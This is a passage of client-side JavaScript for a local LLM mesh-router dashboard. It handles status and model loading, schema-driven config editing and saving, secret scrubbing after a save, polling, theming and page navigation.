  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}m ago`;
  return `${Math.floor(mins / 60)}h ago`;
}

/** Inline sparkline from a numeric series, sized to its container. */
function sparklineSvg(values, color, width = 400, height = 72) {
  const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  svg.setAttribute("viewBox", `0 0 ${width} ${height}`);
  svg.setAttribute("preserveAspectRatio", "none");
  svg.setAttribute("aria-hidden", "true");
  svg.style.width = "100%";
  svg.style.height = `${height}px`;
  svg.style.display = "block";
  // telemetry.history.<series> is whatever the agent sent; a string here used
  // to take the whole Overview page down.
  const series = asArray(values).filter((v) => Number.isFinite(Number(v)));
  if (series.length < 2) return svg;
  const max = Math.max(...series, 1);
  const min = Math.min(...series, 0);
  const span = max - min || 1;
  const step = width / (series.length - 1);
  const points = series
    .map((v, i) => {
      const y = height - ((Number(v) - min) / span) * (height - 6) - 3;
      return `${(i * step).toFixed(1)},${y.toFixed(1)}`;
    })
    .join(" ");
  const line = document.createElementNS("http://www.w3.org/2000/svg", "polyline");
  line.setAttribute("points", points);
  line.setAttribute("fill", "none");
  line.setAttribute("stroke", color);
  line.setAttribute("stroke-width", "2");
  svg.appendChild(line);
  return svg;
}

/* ---------------- config paths ---------------- */

const BLOCKED_PATH_KEYS = new Set(["__proto__", "constructor", "prototype"]);

function getByPath(obj, path) {
  return path.split(".").reduce((o, k) => {
    if (BLOCKED_PATH_KEYS.has(k)) return undefined;
    return o ? o[k] : undefined;
  }, obj);
}

function setByPath(obj, path, value) {
  const parts = path.split(".");
  if (parts.some((k) => BLOCKED_PATH_KEYS.has(k))) return;
  let cur = obj;
  for (let i = 0; i < parts.length - 1; i++) {
    const key = parts[i];
    if (
      !Object.prototype.hasOwnProperty.call(cur, key) ||
      typeof cur[key] !== "object" ||
      cur[key] === null
    ) {
      cur[key] = {};
    }
    cur = cur[key];
  }
  cur[parts[parts.length - 1]] = value;
}

/* ---------------- loaders ---------------- */

async function loadCore(deepStatus = false) {
  const statusPath = deepStatus
    ? "/netllm/v1/status?probe=1&probe_peers=1&scan=1"
    : "/netllm/v1/status";
  // The deep probe fans out to every backend and peer, so it gets the wider
  // budget; a plain GET that takes 15s is broken, this one may not be.
  const status = await api(
    statusPath,
    deepStatus ? { timeoutMs: API_DEEP_TIMEOUT_MS } : {}
  );
  // Left as received: pages distinguish "never loaded" (null) from "loaded and
  // empty". Every read of it goes through asArray/asObject instead.
  state.status = status;
  state.lastUpdatedAt = Date.now();
  updateOmlxAdminLink();
  const [models, env] = await Promise.all([
    api("/v1/models"),
    api("/netllm/v1/client-env"),
  ]);
  // /v1/models is a merge of every backend's catalog, peers included: `data`
  // has arrived as a string, a number and an array of nulls in testing.
  state.models = asArray(asObject(models).data).map((m) => asObject(m));
  const vars = asObject(asObject(env).vars || env);
  state.envVars = vars;
  // Doctor and the header both offer this block as "copy and paste into a
  // shell". The values are agent-derived URLs and keys, not literals we wrote,
  // so quote every one: an unquoted value carrying `;` or a newline would
  // paste as extra commands.
  state.envText = Object.entries(vars)
    .map(([k, v]) => `export ${k}=${shellQuote(v)}`)
    .join("\n");
  try {
    state.doctor = await api("/netllm/v1/doctor");
  } catch (e) {
    state.doctor = { ok: false, issues: [], error: e.message };
    warnAdminLimited(
      "Doctor unavailable (admin API). Use http://127.0.0.1:11400/ui/ on this Mac or set a cluster token."
    );
  }
  try {
    state.telemetry = await api("/netllm/v1/telemetry?watch=0");
  } catch {
    state.telemetry = null;
  }
  try {
    const config = await api("/netllm/v1/config");
    if (!state.dirty) {
      state.config = config;
      state.configDraft = cloneConfig(config);
    }
  } catch (e) {
    warnAdminLimited(
      "Config editor unavailable (admin API). Use http://127.0.0.1:11400/ui/ on this Mac or set a cluster token."
    );
    if (!state.configDraft) {
      state.configDraft = emptyConfigDraft();
    }
  }
  updateStatusLine();
}

function warnAdminLimited(message) {
  if (state.adminWarned) return;
  state.adminWarned = true;
  setBanner(message, "warn");
}

// Section key -> default draft object, built by walking a fetched
// GET /netllm/v1/config/schema section's fields. Falls back to a fixed
// literal when the schema hasn't loaded yet (or predates this endpoint)
// — see docs/config-schema-rewrite-plan.md §5 phase 2 / §4 bootstrap.
function schemaSectionDefaults(schema, sectionKey, fallback) {
  const fields = asArray(asObject(schema?.sections)[sectionKey]?.fields);
  // No usable field list (missing section, or `fields` of the wrong type) means
  // the literal fallback, never a half-built draft.
  if (!fields.length) return fallback;
  const out = {};
  fields.forEach((f) => {
    const field = asObject(f);
    if (typeof field.name === "string" && field.name) out[field.name] = field.default;
  });
  return out;
}

function emptyConfigDraft() {
  return {
    agent: schemaSectionDefaults(state.configSchema, "agent", {
      listen: "127.0.0.1:11400",
      role: "peer",
      advertise: true,
      agent_id: "",
      hostname: "",
    }),
    discovery: schemaSectionDefaults(state.configSchema, "discovery", {
      providers: [...PROVIDERS],
      provider_urls: {},
      custom_endpoints: [],
    }),
    swarm: schemaSectionDefaults(state.configSchema, "swarm", {
      mdns: true,
      subnet_scan: false,
      subnet_cidrs: [],
      heartbeat_interval_s: 10,
      peers: [],
    }),
    routing: schemaSectionDefaults(state.configSchema, "routing", {
      default_strategy: "local_first",
      allow_remote: true,
      backends: [],
      policies: [],
    }),
    ui: schemaSectionDefaults(state.configSchema, "ui", {
      auto_start_on_launch: true,
      log_dir: "",
      check_for_updates_automatically: true,
      model_favorites: [],
      menubar_show_cpu: false,
      menubar_show_gpu: false,
      menubar_show_mem: false,
      menubar_show_live: false,
      menubar_merge_gauges: false,
      menubar_models_favorites_only: false,
    }),
    cloud: schemaSectionDefaults(state.configSchema, "cloud", {
      enabled: true,
      fallback: "cloud",
      fallback_enabled: true,
      providers: {},
    }),
  };
}

function checkForUpdatesAutomatically() {
  const ui = state.config?.ui || state.configDraft?.ui;
  if (ui && ui.check_for_updates_automatically === false) return false;
  return true;
}

async function loadConfigSchema() {
  try {
    state.configSchema = await api("/netllm/v1/config/schema");
  } catch {
    state.configSchema = null;
  }
}

async function loadHarnessRegistry() {
  try {
    state.harnessRegistry = await api("/netllm/v1/harnesses");
  } catch {
    state.harnessRegistry = null;
  }
}

async function loadVersionInfo() {
  try {
    state.versionInfo = await api("/netllm/v1/version");
  } catch {
    state.versionInfo = null;
  }
}

async function loadUpdateCheck(force = false) {
  try {
    state.updateInfo = await api(`/netllm/v1/update/check?force=${force ? 1 : 0}`);
  } catch {
    state.updateInfo = null;
  }
}

async function loadLogs() {
  try {
    state.logs = await api("/netllm/v1/logs?tail=200");
  } catch (e) {
    state.logs = { lines: [], error: e.message };
  }
}

/* ---------------- status chrome ---------------- */

function onlineBackends() {
  return asArray(state.status?.backends)
    .map((b) => asObject(b))
    .filter((b) => b.enabled !== false && asObject(b.health).status !== "offline");
}

function updateStatusBadge() {
  const badge = document.getElementById("status-badge");
  badge.textContent = "";
  let kind = "error";
  let label = "Unreachable";
  if (state.healthy) {
    if (state.status?.draining) {
      kind = "warn";
      label = "Draining";
    } else {
      kind = "ok";
      label = "Running";
    }
  }
  badge.className = `pill ${kind}`;
  badge.appendChild(el("span", "dot"));
  badge.appendChild(document.createTextNode(label));
}

function updateStatusLine() {
  updateStatusBadge();
  const line = document.getElementById("agent-status-line");
  const s = state.status;
  const parts = [];
  if (s?.hostname) parts.push(s.hostname);
  if (s?.role) parts.push(s.role);
  if (s?.listen) parts.push(s.listen);
  if (Number.isFinite(Number(s?.uptime_s))) {
    parts.push(`uptime ${formatDuration(s.uptime_s)}`);
  }
  line.textContent = parts.length ? parts.join(" · ") : "Agent unreachable";

  // Sidebar counts and badges.
  const counts = {
    "nav-count-backends": asArray(state.status?.backends).length || "",
    "nav-count-models": asArray(state.models).length || "",
    "nav-count-peers": asArray(state.status?.peers).length || "",
  };
  Object.entries(counts).forEach(([id, value]) => {
    const node = document.getElementById(id);
    if (node) node.textContent = value === "" ? "" : String(value);
  });

  const doctorDot = document.getElementById("nav-dot-doctor");
  if (doctorDot) {
    const issues = asArray(state.doctor?.issues).length;
    doctorDot.hidden = issues === 0;
  }
  const cloudDot = document.getElementById("nav-dot-cloud");
  if (cloudDot) {
    const cloud = asObject(state.config?.cloud || state.configDraft?.cloud);
    const anyEnabled = Object.values(asObject(cloud.providers)).some((p) => p?.enabled);
    cloudDot.hidden = !(cloud?.enabled && !anyEnabled);
  }

  const version = document.getElementById("sidebar-version");
  if (version) {
    const v = state.versionInfo?.version || state.status?.version;
    version.textContent = v ? `Mesh router · v${v}` : "Mesh router";
  }

  const endpoint = document.getElementById("client-endpoint");
  if (endpoint) {
    endpoint.textContent =
      state.envVars?.OPENAI_BASE_URL ||
      state.envVars?.OPENAI_API_BASE ||
      (state.status?.listen ? `http://${state.status.listen}/v1` : "—");
  }
}

function renderDrainButton() {
  const btn = document.getElementById("btn-drain");
  if (!btn) return;
  btn.textContent = state.status?.draining ? "Resume" : "Drain";
}

/* ---------------- config patch + save ---------------- */

// Turns one list/dict item's draft object into the wire shape
// admin.apply_config_patch expects: read_only fields dropped, write_only
// fields included only when a pending value was actually typed (so omission
// preserves the prior stored value server-side), and `identity` fields sent
// straight back.
//
// The identity case is not an exception to the read_only rule, it is the
// reason the two flags are separate. A row's `row_id` is read_only (no
// control renders it) AND identity (the server matches this entry to a
// stored row by it). Dropping it — which the plain read_only rule did —
// makes an edit to base_url/id read server-side as "delete that row and
// create a new one", and the new row comes back with its write-only api_key
// or secret blank, because a write-only value is exactly the thing a client
// can never send back. Do not "simplify" this branch away.
function schemaItemToPatch(itemSchema, rawEntry) {
  const out = {};
  const entry = asObject(rawEntry);
  asArray(itemSchema).forEach((raw) => {
    const f = asObject(raw);
    if (!f.name) return;
    if (f.identity) {
      const value = entry[f.name];
      // A row the user just added has no id yet — omit rather than send "",
      // so the server mints one instead of matching on an empty string.
      if (typeof value === "string" && value) out[f.name] = value;
      return;
    }
    if (f.read_only) return;
    if (f.write_only) {
      const pendingKey = `_pending_${f.name}`;
      if (entry[pendingKey]) out[f.name] = entry[pendingKey];
      return;
    }
    out[f.name] = entry[f.name];
  });
  return out;
}

// Builds one section's patch by walking its schema fields. A missing schema
// (older agent / fetch failure) falls back to a shallow copy of the draft
// stripped of "_"-prefixed scratch keys rather than silently emitting {}
// and wiping the section on save.
function buildSchemaSectionPatch(sectionKey, schema, draft, pendingKeys = {}) {
  const fields = asArray(asObject(schema?.sections)[sectionKey]?.fields);
  if (!fields.length) {
    const out = {};
    Object.entries(asObject(draft)).forEach(([k, v]) => {
      if (!k.startsWith("_")) out[k] = v;
    });
    return out;
  }
  const patch = {};
  fields.forEach((raw) => {
    const field = asObject(raw);
    if (!field.name || field.read_only) return;
    if (field.write_only) {
      const pendingKey = pendingKeys[field.name] || `_pending_${field.name}`;
      if (draft[pendingKey]) patch[field.name] = draft[pendingKey];
      return;
    }
    if (field.widget === "list" && field.item_schema) {
      patch[field.name] = asArray(draft[field.name]).map((entry) =>
        schemaItemToPatch(field.item_schema, entry)
      );
      return;
    }
    if (field.widget === "dict" && field.item_schema) {
      const out = {};
      Object.entries(asObject(draft[field.name])).forEach(([key, entry]) => {
        if (!key) return; // skip an in-progress "type a name" row
        out[key] = schemaItemToPatch(field.item_schema, entry);
      });
      patch[field.name] = out;
      return;
    }
    patch[field.name] = draft[field.name];
  });
  return patch;
}

function buildCloudPatch(cloudDraft, schema) {
  const draft = asObject(cloudDraft);
  const itemSchema = asArray(asObject(schema?.sections).cloud?.fields).find(
    (f) => asObject(f).name === "providers"
  )?.item_schema;
  const providers = {};
  Object.entries(asObject(draft.providers)).forEach(([pid, rawEntry]) => {
    const entry = asObject(rawEntry);
    providers[pid] = itemSchema
      ? schemaItemToPatch(itemSchema, entry)
      : {
          enabled: !!entry.enabled,
          region: entry.region || "",
          api_format: entry.api_format || null,
          ...(entry._pending_api_key ? { api_key: entry._pending_api_key } : {}),
        };
  });
  return {
    enabled: draft.enabled !== false,
    fallback: draft.fallback || "cloud",
    fallback_enabled: draft.fallback_enabled !== false,
    providers,
  };
}

function buildConfigPatch() {
  const d = state.configDraft;
  const schema = state.configSchema;
  const routingPatch = buildSchemaSectionPatch("routing", schema, d.routing);
  applyDiscoveryCredentialPatch(routingPatch);
  return {
    agent: buildSchemaSectionPatch("agent", schema, d.agent),
    discovery: buildSchemaSectionPatch("discovery", schema, d.discovery),
    swarm: buildSchemaSectionPatch("swarm", schema, d.swarm, {
      cluster_token: "_cluster_token",
    }),
    routing: routingPatch,
    ui: buildSchemaSectionPatch("ui", schema, d.ui),
    cloud: buildCloudPatch(d.cloud, schema),
  };
}

/*
 * Drop every typed-but-now-persisted secret from the draft.
 *
 * The old cleanup walked only cloud.providers.*, which left
 * swarm._cluster_token and discovery._serverCredentials[url]._pending_api_key
 * behind: the plaintext stayed in page memory for the whole session and was
 * re-POSTed on every later, unrelated save — quietly overwriting a key rotated
 * elsewhere in between. Scratch keys are a convention ("_pending_<field>",
 * plus the two named below), so scrub by that convention over the whole draft
 * rather than per-section — a new write-only field then needs no change here.
 */
const DRAFT_SECRET_KEYS = new Set(["_cluster_token", "_serverCredentials"]);

function clearPendingSecrets(node, depth = 0) {
  if (!node || typeof node !== "object" || depth > 8) return;
  if (Array.isArray(node)) {
    node.forEach((item) => clearPendingSecrets(item, depth + 1));
    return;
  }
  Object.keys(node).forEach((key) => {
    if (key.startsWith("_pending_") || DRAFT_SECRET_KEYS.has(key)) {
      delete node[key];
      return;
    }
    clearPendingSecrets(node[key], depth + 1);
  });
}

async function saveConfig() {
  document.getElementById("btn-save").disabled = true;
  try {
    const result = await api("/netllm/v1/admin/config", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(buildConfigPatch()),
    });
    // Only after the POST resolved: a failed save keeps the draft intact so
    // the user can retry without retyping the key.
    clearPendingSecrets(state.configDraft);
    state.config = cloneConfig(state.configDraft);
    markDirty(false);
    const saveNotes = [];
    if (asObject(result).needs_restart) {
      saveNotes.push("Saved — restart agent to apply listen/port changes.");
    }
    const saveWarnings = asArray(asObject(result).warnings);
    if (saveWarnings.length) {
      saveNotes.push(saveWarnings.join(" "));
    }
    if (saveNotes.length) {
      setBanner(saveNotes.join(" "), "warn");
    } else {
      setBanner("Configuration saved.", "ok");
    }
    showToast("Configuration saved");
  } catch (e) {
    showToast("Save failed: " + e.message);
    markDirty(true);
  }
}

/* ---------------- actions ---------------- */

async function runDiscover() {
  const btn = document.getElementById("btn-discover");
  btn.disabled = true;
  try {
    await api("/netllm/v1/admin/discover", { method: "POST" });
    showToast("Discovery complete");
    await refresh();
  } catch (e) {
    showToast("Discover failed: " + e.message);
  } finally {
    btn.disabled = false;
  }
}

async function runPeersScan(save) {
  try {
    showToast("Scanning LAN…");
    const result = await api(`/netllm/v1/admin/peers-scan?save=${save}`, {
      method: "POST",
    });
    state.lanPeers = asArray(asObject(result).peers);
    if (save) await loadCore();
    showToast(asArray(asObject(result).warnings)[0] || `Found ${state.lanPeers.length} peer(s)`);
    if (state.page === "peers") render();
  } catch (e) {
    showToast("Scan failed: " + e.message);
  }
}

async function toggleDrain() {
  const next = !state.status?.draining;
  try {
    await api("/netllm/v1/admin/drain", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ draining: next }),
    });
    if (state.status) state.status.draining = next;
    renderDrainButton();
    updateStatusBadge();
    showToast(next ? "Draining — in-flight requests finish" : "Resumed");
  } catch (e) {
    showToast("Drain failed: " + e.message);
  }
}

async function copyText(text, okMessage) {
  try {
    await navigator.clipboard.writeText(text);
    showToast(okMessage || "Copied");
  } catch {
    showToast("Copy failed — select and copy manually");
  }
}

async function refresh() {
  await loadHealth();
  try {
    await Promise.all([
      loadCore(true),
      loadVersionInfo(),
      loadUpdateCheck(),
      loadConfigSchema(),
      loadHarnessRegistry(),
    ]);
  } catch (e) {
    // Without this the promise rejects into nothing: the page keeps showing
    // the last good data behind a green "Running" badge, which is the most
    // misleading state the dashboard can be in.
    state.healthy = false;
    setBanner(`Could not reach the agent: ${e.message}`, "error");
  }
  // Settled either way — from here on the pages render real (or empty) data
  // rather than the boot placeholder.
  state.firstLoadComplete = true;
  render();
  renderDrainButton();
}

/* ---------------- router ---------------- */

/*
 * Placeholder for the window between "the shell is on screen" and "the first
 * payload arrived". Page renderers assume a loaded state.configDraft/status,
 * so calling them now would only produce "This page failed to render"; an
 * explicit waiting state says the same thing honestly, and any slow or dead
 * agent gets page chrome instead of a blank rectangle.
 */
function renderBootPlaceholder(root) {
  root.appendChild(textEl("h1", "", "Still contacting the agent…"));
  root.appendChild(
    textEl(
      "p",
      "empty",
      "Waiting for the first response. If this persists the agent is not answering — check that it is running and reachable."
    )
  );
}

function render() {
  const key = PAGE_RENDERERS[state.page] ? state.page : "overview";
  const root = document.getElementById(`page-${key}`);
  if (!root) return;
  root.textContent = "";
  if (!state.firstLoadComplete) {
    // Deliberately before updateStatusLine(): the header keeps its neutral
    // "Checking…" badge rather than flashing "Unreachable" at a healthy agent.
    renderBootPlaceholder(root);
    return;
  }
  try {
    PAGE_RENDERERS[key](root);
  } catch (e) {
    console.error(`page "${key}" failed to render`, e);
    root.appendChild(textEl("p", "empty", `This page failed to render: ${e.message}`));
  }
  updateStatusLine();
}

function navigate(page) {
  if (!PAGES.includes(page)) page = "overview";
  state.page = page;
  document.querySelectorAll(".nav-item").forEach((item) => {
    const active = item.dataset.page === page;
    item.classList.toggle("active", active);
    if (active) {
      item.setAttribute("aria-current", "page");
    } else {
      item.removeAttribute("aria-current");
    }
  });
  document.querySelectorAll(".page").forEach((section) => {
    section.classList.toggle("active", section.id === `page-${page}`);
  });
  if (window.location.hash.slice(1) !== page) {
    window.history.replaceState(null, "", `#${page}`);
  }
  stopStatusPolling();
  stopTelemetryPolling();
  stopLogsPolling();
  if (page === "overview") {
    startStatusPolling();
    startTelemetryPolling();
  }
  if (page === "logs") {
    loadLogs().then(() => {
      if (state.page === "logs") render();
    });
    startLogsPolling();
  }
  render();
}

/* ---------------- polling ---------------- */

function visible() {
  return document.visibilityState === "visible";
}

function startStatusPolling() {
  stopStatusPolling();
  state.pollTimer = setInterval(async () => {
    if (!visible() || state.page !== "overview") return;
    try {
      await loadHealth();
      await loadCore(false);
      render();
    } catch {
      /* transient; the badge already reflects health */
    }
  }, 5000);
}

function stopStatusPolling() {
  if (state.pollTimer) clearInterval(state.pollTimer);
  state.pollTimer = null;
}

function startTelemetryPolling() {
  stopTelemetryPolling();
  state.telemetryPollTimer = setInterval(async () => {
    if (!visible() || state.page !== "overview") return;
    try {
      await loadTelemetry(true);
      render();
    } catch {
      /* telemetry is optional */
    }
  }, 5000);
}

function stopTelemetryPolling() {
  if (state.telemetryPollTimer) clearInterval(state.telemetryPollTimer);
  state.telemetryPollTimer = null;
}

function startLogsPolling() {
  stopLogsPolling();
  state.logsPollTimer = setInterval(async () => {
    if (!visible() || state.page !== "logs") return;
    await loadLogs();
    render();
  }, 10000);
}

function stopLogsPolling() {
  if (state.logsPollTimer) clearInterval(state.logsPollTimer);
  state.logsPollTimer = null;
}

function startUpdatePolling() {
  stopUpdatePolling();
  if (!checkForUpdatesAutomatically()) return;
  state.updatePollTimer = setInterval(() => {
    if (!visible()) return;
    loadUpdateCheck().then(() => {
      if (state.page === "preferences") render();
    });
  }, 3600000);
}

function stopUpdatePolling() {
  if (state.updatePollTimer) clearInterval(state.updatePollTimer);
  state.updatePollTimer = null;
}

/* ---------------- theme ---------------- */

/** "system" | "light" | "dark" — mirrors the macOS app's appearance control. */
function applyTheme(theme) {
  const root = document.documentElement;
  if (theme === "light" || theme === "dark") {
    root.setAttribute("data-theme", theme);
  } else {
    root.removeAttribute("data-theme");
  }
  try {
    window.localStorage.setItem("netllm.theme", theme || "system");
  } catch {
    /* private mode — the OS preference still applies */
  }
}

function storedTheme() {
  try {
    return window.localStorage.getItem("netllm.theme") || "system";
  } catch {
    return "system";
  }
}

/* ---------------- wiring ---------------- */

function wireChrome() {
  document.querySelectorAll(".nav-item").forEach((item) => {
    item.addEventListener("click", () => navigate(item.dataset.page));
  });
  document.getElementById("btn-refresh").addEventListener("click", () => refresh());
  document.getElementById("btn-discover").addEventListener("click", () => runDiscover());
  document.getElementById("btn-save").addEventListener("click", () => saveConfig());
  document.getElementById("btn-drain").addEventListener("click", () => toggleDrain());
  document
    .getElementById("btn-env")
    .addEventListener("click", () => copyText(state.envText, "Client env copied"));
  document.getElementById("btn-snippets").addEventListener("click", () => {
    navigate("integrations");
  });

  window.addEventListener("hashchange", () => {
    const page = window.location.hash.slice(1);
    // Only page keys route. The skip link targets #page-main, which used to
    // land here, fail the PAGES lookup and silently reset the user to
    // Overview — so "Skip to content" threw away whichever page they were on.
    if (page && PAGES.includes(page) && page !== state.page) navigate(page);
  });

  window.addEventListener("beforeunload", (e) => {
    if (!state.dirty) return;
    e.preventDefault();
    e.returnValue = "";
  });

  document.addEventListener("visibilitychange", () => {
    if (visible() && state.page === "overview") refresh();
  });
}
